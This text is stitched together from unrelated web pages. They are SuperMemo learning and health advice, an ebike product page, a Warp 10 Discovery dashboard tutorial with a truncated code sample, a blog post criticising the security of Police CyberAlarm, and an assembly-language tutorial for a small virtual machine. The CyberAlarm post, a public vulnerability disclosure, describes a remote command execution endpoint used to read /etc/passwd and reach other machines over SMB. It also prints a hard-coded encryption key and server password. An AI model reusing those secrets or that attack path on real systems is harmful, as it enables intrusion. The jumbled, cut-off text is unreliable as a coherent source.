href="https://supermemo.guru/wiki/20_rules" title="20 rules">20 rules of formulating knowledge</a>), (2) consciously modify representations in the learning process (e.g. <a href="https://supermemo.guru/wiki/Incremental_reading" title="Incremental reading">incremental reading</a> supports this process naturally) (3) work on <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">abstract knowledge</a> (the more you learn the easier it becomes), and (4) get <a href="https://supermemo.guru/wiki/Good_sleep" title="Good sleep">good sleep</a> to employ <a href="https://supermemo.guru/wiki/Neural_optimization_in_sleep" title="Neural optimization in sleep">neural optimization in sleep</a>. If you encounter a difficult problem in <a href="https://supermemo.guru/wiki/Incremental_reading" title="Incremental reading">incremental reading</a>, postpone it. With luck, some other information source will present to you a better representation that is easier to assimilate.
</p>
<h3><span id="Health">Health</span></h3>
<p>Take obsessive care of your health! Keep your blood pressure down (high blood pressure damages your brain), do not <a href="https://supermemo.guru/wiki/Impact_of_alcohol_on_sleep" title="Impact of alcohol on sleep">abuse alcohol</a> (any dose that visibly affects your mental performance may be poisonous to your brain), use medication only when absolutely necessary, exercise, stay away from smoking or illicit drugs, learn medical sciences!!! Your brain is a highly sensitive organ that needs a healthy environment to operate in. Health and understanding of the biological needs of your brain may dramatically affect your performance in the long run. Don't waste time on <a href="https://supermemo.guru/wiki/Formula_for_common_cold_prevention" title="Formula for common cold prevention">colds and flu</a>

This everyday carbon fiber ebike designed by Greg LeMond delivers relaxed racing geometry for easy handling and maneuverability at 26 pounds.</p><p font-size="15" font-weight="300" letter-spacing="0.02em" color="text.black" font-family="text">Greg’s experience and expertise in carbon fiber and ergonomics inform all aspects of the bike design. The minimalized contours and precision components of Prolog converge, rendering an unprecedented ebike.</p><p font-size="15" font-weight="300" letter-spacing="0.02em" color="text.black" font-family="text">Integrated front and rear lights are powered by a lightweight battery housed in the downtube. The battery is part of the Mahle X35+ Smart Ebike System that provides a range of 45 miles with 3 levels of assist, achieving a top speed of 20 mph via a 250 watt rear hub motor.</p></div></div><div width="1,,0.25" order="3"><p font-size="15" font-weight="400" letter-spacing="0.02em" color="text.black" font-family="text">LeMond is reshaping the future of ebikes by expanding their accessibility to all riders. This can only be accomplished by ensuring the entire build is lightweight.</p><p font-size="15" font-weight="400" letter-spacing="0.02em" color="text.black" font-family="text">Carbon fiber was used to optimize every LeMond made component. These include the frame and fork, a monocoque handlebar-stem, custom carbon fiber fenders, seat post, as well as a custom carbon rear rack and front basket. In addition, LeMond teamed up with Munich Composites to develop a state-of-the-art carbon braided wheelset with tune hubs, as an upgrade option.</p><p font-size="15" font-weight="400" letter-spacing="0.02em" color="text.black" font-family="text">An 11-speed Shimano drivetrain combined with a lightweight build allows the Prolog to ride well over any terrain. Shimano’s Di2 electronic shifting is also available as an upgrade.</p></div></div></div><div display="flex"><div display="flex"><p><span font-size="34" font-family="display" font-weight="600" color="text.black">Colors /<br>Electronics</span></p><div width="1,,0.25" order="3"><div display="flex"><div display="flex"><p><span font-size="15" font-weight="300" color="black" font-family="text">matte finish; black<br>decals</span></p></div><div display="flex"><p><span font-size="15" font-weight="300" color="#C7C7C7" font-family="text">matte finish; silver<br>decals</span></p></div></div></div><div width="1,,0.25" order="4"><p font-size="15" font-weight="400" letter-spacing="0.02em" color="text.black" font-family="text">Months went into testing and sourcing the optimal ebike system for weight, performance, and durability. The Mahle X35+ Smart Ebike System provides all of the features and characteristics required for a quick, lightweight, and elegantly designed ebike. At just 7.7 pounds, it is one of the lightest systems on the market.</p><p font-size="15" font-weight="400" letter-spacing="0.02em" color="text.black" font-family="text">•&nbsp;Assistance up to 20

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>With its unique dashboards as code approach, Warp 10 Discovery is the tool of choice to create highly dynamic dashboards from your time series data</p><article>
      
<p>When you hear people talk about time series, chances are pretty high they will also coin the term dashboard in the same conversation. The reason for that is simple. <strong>Among the first things people do when working with time series databases is the creation of dashboards to visualize the stored data.</strong></p>



<p>Despite some efforts to create alternative tools or services, <a href="https://en.wikipedia.org/wiki/Grafana" target="_blank" rel="noreferrer noopener">Grafana</a> remains the number one choice for many to create dashboards. Sure Grafana is great. It can connect to many data sources, has some nice themes and widgets. And it has a visual interface for building dashboards that appeals to newcomers. </p>



<p>But once you get into some serious monitoring and want to build complex dashboards, the visual interface you used to love quickly becomes the one you start hating. Indeed it is long and tedious to create large dashboards this way and impossible to create what we call dynamic dashboards.</p>



<h2>What are dynamic dashboards ?</h2>



<p>For some, dynamic dashboards are the ones that periodically update with recent data. For others, they are dashboards which can display information about a variable number of systems based on parameters that are chosen dynamically by the viewer. Though there is indeed a dynamic nature to those dashboards it is really light.</p>



<p><strong>What we call dynamic dashboards are dashboards whose content can completely change depending on the actual context.</strong> Instead of always showing the same graphs, dynamic dashboards will display contextual information that will immediately catch your attention. </p>



<p>Imagine for example a dashboard showing the current trend for a system. It will display the last hour of data and will rely on you to spot the anomalies. A dynamic dashboard on the other hand would also display the last hour as the standard dashboard. But upon detecting a specific situation it would additionally display graphs for other systems, the list of alerts which were triggered, links to knowledge base articles related to the nature of the current incident, and a status of possibly impacted systems, all on the same screen.</p>



<p><strong>Building such dashboards using a tool like Grafana is impossible</strong>. You would probably need to build a full-fledged application that may redirect to different Grafana dashboard URLs depending on the context. Not the most efficient way to go...</p>



<h2>Introducing Discovery</h2>



<p>At <a href="https://senx.io/" target="_blank" rel="noreferrer noopener">SenX</a> we strongly believed that there was a better way and we proved it with the creation of <em>Discovery</em>.</p>



<p>Discovery is SenX's dashboarding solution for the <a href="https://warp10.io/" target="_blank" rel="noreferrer noopener">Warp 10</a> Time Series Platform. <strong>What makes Discovery unique is its <em>Dashboards as Code</em> approach.</strong> </p>



<p>With Discovery, creating dashboards is simply a matter of using a specific macro in your <a href="https://www.warp10.io/content/03_Documentation/04_WarpScript" target="_blank" rel="noreferrer noopener">WarpScript</a> or <a href="https://blog.senx.io/introducing-flows/" target="_blank" rel="noreferrer noopener">FLoWS</a> code.</p>



<p>The macro expects a list of <em>tile</em> descriptions and an optional set of global parameters. It will produce an HTML rendering of your dashboard, complete with auto-refresh capabilities.</p>



<p>Coupled with the <a href="https://blog.senx.io/http-plugin/" target="_blank" rel="noreferrer noopener">HTTP Plugin</a>, you can serve those dashboards directly from your Warp 10 instance, avoiding the need to deploy and operate additional tools such as Grafana and therefore keeping your cloud bill under more control.</p>



<p>And since your dashboards are now pieces of code, you can use git to manage them and track changes. No more bad surprises after a colleague changed the style or the layout of important dashboards because s/he thought the change was only local... I'm sure you have experienced this before!</p>



<h2>Discovery in practice</h2>



<p>Putting Discovery to work is very simple. You should have your first dashboard available minutes after you start.</p>



<h3>Configuring the HTTP Plugin</h3>



<p>The first step to use Discovery is to configure the HTTP Plugin in your Warp 10 instance. To do this, add the following lines to a configuration file and restarting the instance:</p>



<pre><code># Load the HTTP Plugin
warp10.plugin.http = io.warp10.plugins.http.HTTPWarp10Plugin
# Define the directory where endpoint spec files will reside
http.dir = /path/to/http.dir
# Define the host and port the plugin should bind to
http.host = 127.0.0.1
http.port = 12345
# Expose the Directory and Store so FETCH requests can be performed via the plugin
egress.clients.expose = true</code></pre>



<p>The next step is to create a <code>discovery.mc2</code> endpoint specification file for the HTTP Plugin. Create this file in the <code>http.dir</code> directory defined above with the following content:</p>



<pre><code>{
  'path' '/discovery/'
 &nbsp;'prefix' true
 &nbsp;'parsePayload' true
 &nbsp;'macro' &lt;%
 &nbsp;&nbsp; 'prefix/dashboard/' @senx/discovery/dispatcher
 &nbsp;%&gt;
} </code></pre>



<p>This specification defines the handling of requests to the HTTP Plugin for URLs starting with <code>/discovery/</code>. Requests for <code>/discovery/foo/bar</code> will invoke the macro <code>@prefix/dashboard/foo/bar</code>. The macro will be called with the <code>request</code> object from the HTTP Plugin and is expected to return the HTML content of your dashboard, more on this later.</p>



<p>The dispatching of requests is ensured by the macro <code>@senx/discovery/dispatcher</code>. This macro is available on SenX' WarpFleet macro repository which is configured by default in the Warp 10 distribution via the line:</p>



<pre><code>warpfleet.macros.repos = https://warpfleet.senx.io/macros</code></pre>



<p>If you would rather host the macro locally, you can <a href="https://warpfleet.senx.io/macros/senx/discovery/dispatcher.mc2" target="_blank" rel="noreferrer noopener">download </a>it and save it under <code>senx/discovery/dispatcher.mc2</code> in your instance local macro repository.</p>



<h3>Creating dashboards</h3>



<p>The second and final step is to create macros for each of your dashboards. If you have configured the plugin as above, those macros should be in the subdirectory <code>prefix/dashboard</code> of the macro repository of your Warp 10 instance.</p>



<p>Dashboard macros are pretty simple. They define tiles which compose your dashboard and call a macro that renders those tiles as HTML. This macro and a set of side macros are also available on SenX' WarpFleet macro repository. In case you want to deploy them locally, download the following files:</p>



<p><code><a href="https://warpfleet.senx.io/macros/senx/discovery/render.mc2" target="_blank" rel="noreferrer noopener">@senx/discovery/render.mc2</a></code></p>



<p><code><a href="https://warpfleet.senx.io/macros/senx/discovery/tile.mc2" target="_blank" rel="noreferrer noopener">@senx/discovery/tile.mc2</a></code></p>



<p><code><a href="https://warpfleet.senx.io/macros/senx/discovery/layout.mc2" target="_blank" rel="noreferrer noopener">@senx/discovery/layout.mc2</a></code></p>



<p><code><a href="https://warpfleet.senx.io/macros/senx/discovery/html.mc2" target="_blank" rel="noreferrer noopener">@senx/discovery/html.mc2</a></code></p>



<p>and deploy them in subdirectory <code>senx/discovery</code> of your Warp 10 instance macro repository (configured via <code>warpscript.repository.directory</code>).</p>



<p>The <code>@senx/discovery/render</code> macro expects a map as input with the following entries:</p>



<pre><code> {
 &nbsp; &nbsp; 'title' 'My Dashboard'
 &nbsp; &nbsp; 'description' 'My tremendous dashboard'
 &nbsp; &nbsp; 'tiles' [ ... ]
 &nbsp; &nbsp; // Custom CSS styles
 &nbsp; &nbsp; 'styles' '&lt;style&gt; body { background: pink; }&lt;/style&gt;'
 &nbsp; &nbsp; // Custom HTML Header
 &nbsp; &nbsp; 'header' '&lt;div&gt;&lt;img src="myLogo.png"&gt;&lt;/div&gt;'
 &nbsp; &nbsp; // Custom HTML Footer
 &nbsp; &nbsp; 'footer' '&lt;p&gt;Copyright SenX.io&lt;/p&gt;'
 &nbsp; &nbsp; 'cols' &nbsp; 12 &nbsp; &nbsp; // Number of columns of the grid, default is 12
 &nbsp; &nbsp; 'height' 220&nbsp; &nbsp; // Row height in pixels, 220 by default
 &nbsp; &nbsp; 'template' '...' &nbsp; // Custom HTML template
 } </code></pre>



<p>The only mandatory element is <code>tiles</code> which must be associated with a list of tile descriptions. Each tile description if a map with the following elements:</p>



<pre><code>{
 'title' 'Title of the tile' // optional
 'x' 0 // Horizontal position in the grid, between 0 and grid width - optional, defaults to 0.
 'y' 0 // Vertical position in the grid - optional, defaults to 0.
 'w' 1 // Width of the tile in number of grid columns - optional, defaults to 1.
 'h' 1 // Height of the tile in number of grid rows - optional, defaults to 1.
 'options' {} // WarpView specific options - optional (!).
 'type' 'plot' // Type of WarpView tile - optional, defaults to `plot`.
 'endpoint' 'https://sandbox.senx.io/api/v0/exec' // Warp 10 `/api/v0/exec` url - mandatory when 'macro' is set.
 'macro' &lt;% ... %&gt; // WarpScript macro to run to produce data for the tile - use only if 'data' is not set.
 'data' ... // Data to represent in the tile resulting from a WarpScript execution - use only if 'macro' is not set. The content type depends on the type of the tile.
}</code></pre>



<p>The types of tiles you can use are those from the <a href="https://github.com/senx/warpview/wiki" target="_blank" rel="noreferrer noopener">WarpView</a> web component library.</p>



<p>That's it! <strong>You should now be able to create your dashboards</strong>, but to make things even clearer we will walk you through an example.</p>



<h3>Demo dashboard</h3>



<p>The first step is to plan the layout of your dashboard, you can sketch it out quickly on a piece of paper:</p>



<div><figure><img loading="lazy" src="https://blog.senx.io/wp-content/uploads/2020/11/Screen-Shot-2020-11-25-at-11.38.29--1024x638.png" alt="outline of your dashboard" width="388" height="242" srcset="https://blog.senx.io/wp-content/uploads/2020/11/Screen-Shot-2020-11-25-at-11.38.29--1024x638.png 1024w, https://blog.senx.io/wp-content/uploads/2020/11/Screen-Shot-2020-11-25-at-11.38.29--300x187.png 300w, https://blog.senx.io/wp-content/uploads/2020/11/Screen-Shot-2020-11-25-at-11.38.29--768x478.png 768w, https://blog.senx.io/wp-content/uploads/2020/11/Screen-Shot-2020-11-25-at-11.38.29-.png 1124w" sizes="(max-width: 388px) 100vw, 388px"><figcaption>Outline of our dashboard</figcaption></figure></div>



<p>Then create the macro which will define the tiles and call @senx/discovery/render to generate the HTML. In our example, the first line plot will get its data via the <code>data</code> field, the second one via a macro executed on the <a href="https://sandbox.senx.io/" target="_blank" rel="noreferrer noopener">Warp 10 Sandbox</a>.</p>



<p>The resulting WarpScript code for our dashboard is:</p>



<pre><code> &lt;%
 &nbsp; {
 &nbsp; &nbsp; 'tiles' [
 &nbsp; &nbsp; &nbsp; {
 &nbsp; &nbsp; &nbsp; &nbsp; 'type' 'display'
 &nbsp; &nbsp; &nbsp; &nbsp; 'w' 3 'h' 1 'x' 3 'y' 0
 &nbsp; &nbsp; &nbsp; &nbsp; 'data' 'Hello Discovery'
 &nbsp; &nbsp; &nbsp; }
 &nbsp; &nbsp; &nbsp; {
 &nbsp; &nbsp; &nbsp; &nbsp; 'type' 'line'
 &nbsp; &nbsp; &nbsp; &nbsp; 'w' 4 'h' 2 'x' 0 'y' 1
 &nbsp; &nbsp; &nbsp; &nbsp; 'data' [

           FOR
         ]
 &nbsp; &nbsp; &nbsp; }
 &nbsp; &nbsp; &nbsp; {
 &nbsp; &nbsp; &nbsp; &nbsp; 'type' 'line'

<article id="5fbcefde44b88204da4fb1cc">


<figure><img src="https://paul.reviews/content/images/2020/11/cyber-alarm-1.png"></figure><p>Phew! It's been 3 long years since my last article... and I've deliberated over posting this for way too long. &nbsp;But, I feel it's important enough to warrant at least some debate.</p><p>2 months ago, I came across a tweet by Lancashire Police Fraud &amp; Cyber advertising CyberAlarm; a govt-funded tool to help protect companies from cyber attacks.</p><figure><blockquote><div lang="en" dir="ltr"><p>Police CyberAlarm helps small businesses, charities, academia and local authorities get upp-to-date knowledge of cyber attack types and trends which is an absolute key to having a robust defence. </p><p>Businesses can sign up for memeberships at <a href="https://t.co/JTFlQg7yMV">https://t.co/JTFlQg7yMV</a> 🖥️ <a href="https://t.co/bq88tsZYsa">pic.twitter.com/bq88tsZYsa</a></p></div>— Lancs Police Fraud &amp; Cyber (@LancsFraudCyber) <a href="https://twitter.com/LancsFraudCyber/status/1310535084324327425?ref_src=twsrc%5Etfw">September 28, 2020</a></blockquote>

</figure><p>Interest piqued, I signed up and awaited my "access code" which is necessary to gain access to the downloads page. Or so I thought.</p><p>A few days later, I was contacted by a Cyber Protect officer from Leicestershire Police who explained there was no download link for the "live" product on the grounds of "data confidentiality". &nbsp;I'm not sure I understand that premise, given it's a product intended for public use... but I digress. &nbsp;Instead, he provided an "installation guide" PDF which outlined how the product worked &amp; how to install it. &nbsp;If I still wanted to proceed, he could provide the access code.</p><p>Here's a segment of the installation guide...</p><figure><img src="https://paul.reviews/content/images/2020/11/1.PNG"></figure><p>--</p><p>Their installation guide suggests running it inside a DMZ (de-militarized zone, an isolated segment from other network assets) or "<strong>on your internal network</strong>".</p><p>For many firms, especially SME, the concept of running a DMZ is alien; with many network assets all joined together with no logical/physical segmentation whatsoever. &nbsp;This is crucial, as isolating potentially dangerous assets (IoT, BYOD devices etc) from your core infrastructure is vital to help prevent attacks travelling across your network.</p><p>Unfortunately, it's likely to be those smaller SMEs without a DMZ who deploy CyberAlarm; in the mistaken belief it's a safe &amp; secure way to mitigate cyber threats.</p><p>If you're going to run <em>anything </em>on your internal network, you must be able to ensure the product is reasonably secure. &nbsp;Faith-based security rarely ends well, so let's dive in.</p><h2 id="installation-">Installation:</h2><p>In the installation guide, they advise you to deploy this on a dedicated machine... which seems reasonable, until they explain why...</p><figure><img src="https://paul.reviews/content/images/2020/11/2.PNG"></figure><p>Disable SELinux?!</p><p>SELinux or "Security-Enhanced Linux" is a mandatory access control (MAC), a vital security tool built into CentOS (based on RedHat Linux). &nbsp;It's designed to protect system administrators from themselves; enforcing strict security policies and ensuring isolation between processes. &nbsp;If it's disabled, poorly-configured or malicious apps/services have root access (aka - total control) over the device.</p><p>NCSC quite rightly state "rooted/jailbroken devices are a threat to sensitive data" (<a href="https://www.ncsc.gov.uk/guidance/application-development-guidance-introduction">https://www.ncsc.gov.uk/guidance/application-development-guidance-introduction</a>), but NPCC are actively pushing a product which requires you to effectively root your device!</p><p>If you take NCSC's advice (and you really should!), this alone is a deal-breaker. &nbsp;The <em>only</em> reason you'd disable a vital security control is because you're too idle/inept to overcome the issue which prompted you to disable it in the first place. &nbsp;If you need further proof of this ridiculous decision, here's an article on the CentOS blog called <a href="https://blog.centos.org/2017/07/dont-turn-off-selinux/">No! Don't turn off SELinux!</a> in which Thomas Cameron, Chief Architect for Red Hat says "Linux is a gun and you know where your foot is".</p><p>Anyway...</p><p>I noticed a screenshot with the download link and without an access code or authentication, I proceeded to download the 2GB virtual machine image and launched it with VMWare Workstation.</p><h3 id="opening-pandora-s-box-">Opening Pandora's box...</h3><p>There's a lot to get through, so I'll summarise as much as possible.</p><h3 id="php-5-4">PHP 5.4</h3><figure><img src="https://paul.reviews/content/images/2020/11/5.png"></figure><p>PHP 5.4 was end of life in September 2015. &nbsp;No more security patches or updates, it's dead and should never be used in a production app. &nbsp;I'll also mention, I put this "phpinfo" file here remotely; it's not part of CyberAlarm.</p><h3 id="remote-network-access-via-rce">Remote Network Access via RCE</h3><p>This one beggars belief. &nbsp;The app has a file called "getmon.php" which literally serves as an RCE (remote command execution) endpoint.</p><figure><img src="https://paul.reviews/content/images/2020/11/4.png"></figure><p>The above image shows me grabbing /etc/passwd from the virtual machine.</p><p>That's bad enough, but what if the attacker is slightly more creative?</p><p>Here, we use the SMB protocol to <strong>connect to another PC inside the network</strong> and grab sensitive data from it.</p><figure><img src="https://paul.reviews/content/images/2020/11/3.png"></figure><p>If you have sensitive data, trade secrets or anything else important on your network, it's now remotely accessible to <em>anyone, anywhere </em>when you view a web page. &nbsp;We haven't placed anything on the network/virtual machine to achieve this either... the attacker is just carrying out commands as if they're sat inside your network.</p><p>Let me be really clear about this. &nbsp;This vulnerability allows a remote attacker to entirely bypass your firewall and exfiltrate <em>any </em>data accessible over your network; you only need to visit a vulnerable web page once.</p><h3 id="cross-site-scripting">Cross Site Scripting</h3><p>Looking through the code, there's no attempt to sanitize (or make safe) any user inputs, so an attacker can remotely inject malicious code into any page on the box. &nbsp;Here, we hijack the "registration" page.</p><figure><img src="https://paul.reviews/content/images/2020/11/6.png"></figure><h3 id="tls-certificate-expiry">TLS certificate expiry</h3><p>It should go without saying, but if your security certificate expires, it's no longer secure.</p><figure><img src="https://paul.reviews/content/images/2020/11/7.png"></figure><h3 id="broken-encryption">Broken Encryption</h3><p>The strongest of door locks is rendered insecure if you leave the key somewhere vulnerable. &nbsp;The same applies in cryptography. &nbsp;It's absolutely vital to generate a cryptographically random key and handle it securely.</p><p>Sadly, CyberAlarm does neither.</p><p>The "key" is static and hard-coded: "P3rv4d3S0ftw4r3"</p><p>Reading between the character substitution, you'll see "Pervade Software" - the developers behind CyberAlarm.</p><p>To make matters worse, they use AES-CBC, which can be implemented securely by a competent developer. &nbsp;Alas here, the weak key and complete lack of MAC (message authentication code) means they cannot trust <em>any </em>of the data they collect.</p><p>A MAC is vital; it allows the recipient to ensure the data hasn't been manipulated during transit. &nbsp;Without it, they're actioning harvested data collected from "data collectors" with <strong>absolutely no guarantee</strong> of its integrity. &nbsp;Far from improving security, I'd argue this makes matters worse. &nbsp;Your reports could be entirely fake or largely contain data you can't act upon; diverting your attention from real risks.</p><h3 id="broken-encryption-part-deux">Broken Encryption &nbsp;- Part Deux</h3><p>One sure-fire way to ensure your product is entirely insecure is to disable all security checks on your certificate, which of course, CyberAlarm does.</p><figure><img src="https://paul.reviews/content/images/2020/11/8.PNG"></figure><p>This means all updates are insecure - allowing an attacker to put <em>anything </em>on the device remotely. &nbsp;Note: I've added the comments in this screenshot to clarify what each line does.</p><h3 id="embedding-server-passwords-in-code-">Embedding server passwords in code!</h3><p>Seriously.</p><p>When the app needs to grab a list of "jobs" or tasks to carry out locally, it logs in with a password of "3jscove".</p><figure><img src="https://paul.reviews/content/images/2020/11/image.png"></figure><p>If you're wondering, the "phash" function is a wrapper for SHA-256; another insecure &amp; unsuitable choice for password hashing.</p><h2 id="insert-record-scratch-sound-here">&lt;insert record scratch sound here&gt;</h2><p>In light of all these failings, I notified Leicestershire Police and awaited their response.</p><p>When it came, I was stunned.</p><p>The link I'd "found" (from their installation guide) was a 2yr old "test" version never intended for public use! &nbsp;Great, it's 2 years old... now your dependencies are only 3 years out of date instead &lt;/sarcasm&gt;</p><p>I'm not about to disclose the entire conversation or the meetings which followed, but when the phrase "no deal breakers" was uttered, I realised this has to go public. &nbsp;In fairness, they have put me in touch with the CTO at Pervade with a view to "making the product better" but after a couple of brief conversations (none of which technical) and despite his candid response, my position now hasn't changed from day one.</p><p>This pilot should be pulled <strong>immediately</strong>. I'd actually go one step further and question how a product with so many simple but critical security flaws could ever be promoted by the Police.</p><h2 id="the-actual-live-version-">The "actual" live version...</h2><p>Following my criticisms over the "old" version, I was given an access code to allow me to download the "live" one.</p><p>Suffice to say, little has changed.</p><p>The code is still woefully insecure, as is the implementation of several core features and in all honesty, I just haven't the time nor motivation to explain why disabling security controls is a bad idea. Sorry Jon.</p><h2 id="obscurity-hides-a-thousand-sins-">Obscurity hides a thousand sins...</h2><p>What I haven't yet mentioned, is the fact that every single line of code in CyberAlarm is encoded/obfuscated using IonCube. &nbsp;By obscuring the code, it prevents any casual observer from uncovering the mess contained within.</p><figure><img src="https://paul.reviews/content/images/2020/11/10.PNG"></figure><p>Thankfully, IonCube is easily reversed (as is any encoding) and offers very little real-world protection. &nbsp;However, CyberAlarm has apparently "passed" a penetration test which, assuming it wasn't carried out by Stevie Wonder, beggars belief.</p><h2 id="summary">Summary</h2><p>CyberAlarm is sadly nothing more than an insecure, poor-designed/engineered wrapper around OpenVAS - an open-source vulnerability assessment scanner.</p><p>I appreciate the forces may disagree with my findings and/or conclusions, however whilst they don't consider any of the above to be "deal breakers", the public are now able to decide if they're willing to entrust their firms security to a product like CyberAlarm.</p><p>If you're in #infosec (even if you're not), I welcome your comments below.</p><h3 id="update-s-">Update(s)</h3><p>25/11/20 3PM: Thanks to Dave Walker on Twitter for pointing out a mistake regarding CentOS. &nbsp;My screenshots show a later build with CentOS 7 / PHP 5.4 so to avoid confusion, I've removed that section. Apologies folks.</p><p>27/11/20 17:30PM: The NPCC have <a href="https://cyberalarm.police.uk/pca-official-response/">published a response</a>, claiming this is "completely untrue". &nbsp;Needless to say, they're entirely wrong... but I've been hearing that story for 2 months. &nbsp;I'll reply here shortly, however for more immediate updates, keep your eyes peeled on <a href="https://twitter.com/paul_reviews">@paul_reviews</a> - where I've already disproven their first claim (they never provided a link to the …</p></article></div></div>

    <h2>Scope of Blog</h2>

    <p>To provide a very simple overview of the assembly programming language in <a href="https://github.com/Kully/VLAHB">VLAHB</a> and assembly programming principles in general. Machine code and opcodes is beyond the scope of this blog post.</p>

    <h2>The Brains of the Operation</h2>

    <p>A <b>virtual machine</b> ("vm") acts like a real computer but it only exists within software and not hardware. This means that a virtual machine is not made of physical pieces of etched silicon, printed circuit boards, transistors or capacitors or anything like that. Instead it is "virtual" which means that we program this computer ourselves to do what want: to read and execute binary files according to a blueprint we give it.</p>

    <p>Checkout the file called <a href="https://github.com/Kully/VLAHB/blob/master/vm.c#L142-L571">vm.c</a> in <b>VLAHB</b>. See the <b>switch</b> statement and all the <b>case</b> lines? This is code that tells the virtual machine that if it sees an instruction <b>0x0001</b>, do <b>X</b>. If it sees <b>0x0002</b>, do <b>Y</b>, and so on and so forth.</p>


    <h2>Assembly to Binary</h2>

    <p><b>VLAHB</b> is a vm together with an assembly language - let's call it <b>VASM</b> - and an assembler (<i>assembler.py</i>) which converts assembly files (<i>file.asm</i>) to raw machine code (<i>file.bin</i>) that our vm can read and execute.</p>

    <p><img src="http://adamkulidjian.com/imgs/asm_hex_bin_thinarrow.png"></p><p>The process of turning file.asm to file.bin is called <b>assembling</b>.</p>

    <p>Our vm features a special integer called a <b>program counter</b> ("pc") which keeps track of what line the vm is reading at a time. When you tell the vm to run the program <i>myFile.bin</i>, the <b>pc</b> value is assigned to the line number of the program that the vm will begin "reading" (think Turing Machine). The pc is set to this value and then...</p>

    <ul>
        <li>vm reads instruction</li>
        <li>vm executes instruction</li>
        <li><i>pc increments</i></li>
        <li>vm reads instruction</li>
        <li>vm executes instruction</li>
        <li><i>pc increments</i></li>
        ... and so on
    </ul>
    <p>Nothing is inherently special about these cryptic codes. <b>1002 0003 0000 fde8</b> has no inherent meaning but the vm reads and knows to load the literal 65000 into ram at index 4098.</p>

    <h2>RAM</h2>

    <p>There is a list called <b>ram</b> stored in our virtual machine <a href="https://github.com/Kully/VLAHB/blob/master/vm.c">vm.c</a>. It contains 65535 0's. Each slot of ram holds an integer from 0 to 4294967295. By changing the values in our ram slots we can get super mario to run across the screen, create a paint application, or solve world peace.</p>

    <pre><code>// Empty brackets <b>[ ]</b> represent <b>0</b>
ram := [ ][ ][ ][ ][ ][ ][ ][ ]...
        ^  ^  ^  ^  ^  ^  ^  ^ 
        0  1  2  3  4  5  6  7 </code></pre>

    

    <p><b>Ram Slot Dedication:</b> this represents how our ram slot are organized

    </p><pre><code>[-----------] [-------] [--] [---------] [---------------------------]
0       4095  4096 4099 4100 4101  27140 27141                   65535 
</code></pre>

    <table>
        <tbody><tr>
            <th>slots in ram</th>
            <th>what they do</th>
        </tr>
        <tr>
            <td>0-4095</td>
            <td>function inputs</td>
        </tr>
        <tr>
            <td>4096-4099</td>
            <td>4 pointers (U,V,Y,Z resp.)</td>
        </tr>
        <tr>
            <td>4100</td>
            <td>return slot for function outputs</td>
        </tr>
        <tr>
            <td>4101-27140</td>
            <td>vram</td>
        </tr>
        <tr>
            <td>27141-65535</td>
            <td>free space</td>
        </tr>
    </tbody></table>

    <h2>Simple Operations</h2>

    <p>The simplest operation to perform on ram is a direct load. This loads a value into a slot of ram.</p>

    <p>
    <b> Ex. 1 </b></p><pre><code>LD R[3] 2  // load 2 into the slot of ram at index 3
</code></pre>

    <pre><code>
ram := [ ][ ][ ][2][ ][ ][ ][ ]...
        ^  ^  ^  ^  ^  ^  ^  ^ 
        0  1  2  3  4  5  6  7 
    </code></pre>

    <p>There are other ways to manipulate ram. <b>VASM</b> handles all the basic operations <b>+</b>, <b>-</b>, <b>×</b>, <b>÷</b></p>

    <p>
    <b>Ex. 2</b></p><pre><code>ADD R[1] 8     // ram[1] = ram[1] + 8
SUB R[2] R[1]  // ram[2] = ram[2]-ram[1]
MUL R[2] 5     // ram[2] = ram[2] * 5</code></pre>

    <hr>

    <p><b>Exercise 1</b> What happens to ram after compiling this assembly code and running it in vm?
    <br><i>(assume <b>ram</b> is initialized as an array of 0s)</i></p><pre><code>LD R[2] 2
MUL R[2] 2
LD R[69] 3
MUL R[2] R[3]
EXIT</code></pre>


    <h2>Labels</h2>

    <p>Our assembly language supports a primitive to functions called <b>LABELS</b>. When assembly code is compiled down to machine instructions for the virtual machine, labels don't appear in the code. Instead they are treated as markers in the code where you can loop to, jump to, etc. Therefore it is better to write <b>GOTO MY_FIRST_LABEL</b> rather than something like <b>GOTO 1729</b>.</p>

    <pre><code>MATH_ADD_TWO_NUMBERS:
LD R[4100] R[0]
ADD R[4100] R[1]  // store the sum of R[0] and R[1] into R[4100]
RETURN
</code></pre>

    <p><i>Q. Why are we storing stuff in <b>R[4100]</b>?</i></p><p>

    <i>A. Our function output is by convention stored at <b>R[4100]</b>. We could have picked <b>R[1729]</b>.</i></p><p>To jump the pc to a label, call it with the <b>CALL</b> opcode. This pushes the current pc to the <b>stack</b> - a stack in the CPU - and the pc is set to the line where the label is</p>

    <p><b>RETURN</b>: this <b>pops</b> the pc from the stack and sets the pc to that popped value. If we write something like the code snippet below then ram will not be touched.</p>



    <pre><code>CALL WHAT_IS_LIFE
EXIT

// we never go here
LD R[0] 55
LD R[1] 51
LD R[2] 44

WHAT_IS_LIFE:
    RETURN
</code></pre>


    <p><i>But why?</i> Once we hit <b>CALL WHAT_IS_LIFE</b>, the pc will be pushed, and the pc jumps to <b>WHAT_IS_LIFE</b>. The stack and pc now looks like this:</p>

    <pre>    stack = [0]
    pc = 0
    </pre>

    <p>In the next line we hit a <b>RETURN</b>, which means we <b>pop</b> from the stack and assign our pc to that value.</p>

    <pre>    stack = [ ]
    pc = 0
    </pre>

    <p>Now we advance a line to the second line of our program and hit <b>EXIT</b>. The vm exits.</p>
    
    <hr>

    <p><b>Exercise 2</b> Describe in your own words what the program below is doing to ram.

    </p><pre><code>LD R[0] 3
LD R[1] 4
CALL DO_SOMETHING
EXIT

DO_SOMETHING:
    LD R[4100] R[0]
    ADD R[4100] R[1]
    RETURN
</code></pre>


    <h2>Pointers</h2>

    <p>Let's say you want to be able to programmatically place values in ram with assembly. Let's say for instance you want to put 7 in R[3], 7 in R[6], and 7 in R[9].</p>

    <p>Notice that our index of ram is a multiple of 3 each time: 3, 6, 9. We can write</p>

    <pre><code>LD R[3] 7
LD R[6] 7
LD R[9] 7
</code></pre><p>

    but with a pointer:

    </p><pre><code>LD R[4096] 3  // pointer U
LD R[U] 7

ADD R[4096] 3  // R[4096] -&gt; 6
LD R[U] 7

ADD R[4096] 3  // R[4096] -&gt; 9
LD R[U] 7
</code></pre>


    <p><i>How does this work?</i></p><p>
